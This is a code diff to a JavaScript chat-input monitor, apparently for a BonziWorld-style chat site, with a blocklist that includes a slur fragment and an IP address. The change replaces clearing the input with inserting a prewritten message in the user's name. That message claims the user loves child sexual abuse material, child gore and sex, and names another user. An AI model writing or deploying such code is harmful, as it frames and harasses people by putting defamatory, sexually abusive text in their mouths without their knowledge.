@@ -6,15 +6,14 @@ function monitorChatInput() {
   }
 
   const detectionIntervalMs = 100; // Check every 100 milliseconds (faster than average human reaction time)
-  const forbiddenWords = ["nigg", "bonziworldee", "78.63.40.199", "https://bonziworld", "saiya"]; // Changed to an array for multiple words
+  const forbiddenWords = ["nigg", "bonziworldee", "78.63.40.199", "https://bonziworld", "saiyan"]; // Changed to an array for multiple words
 
   setInterval(() => {
     const currentInput = inputElement.value.toLowerCase();
     for (const word of forbiddenWords) {
       if (currentInput.includes(word)) {
-        alert("NOPE, GTFO");
         // Option 1: Clear the input field
-        inputElement.value = "";
+        inputElement.value = "i type in weird ass saiyan parts and ooh i like to advertize lololool i disobey ivorydevrimo and i love cp lalalala and cp and child gore the best lol i love baldifunrps sex";
         break; // Exit the loop after finding a forbidden word
 
         // Option 2: Disable the input field (more drastic)
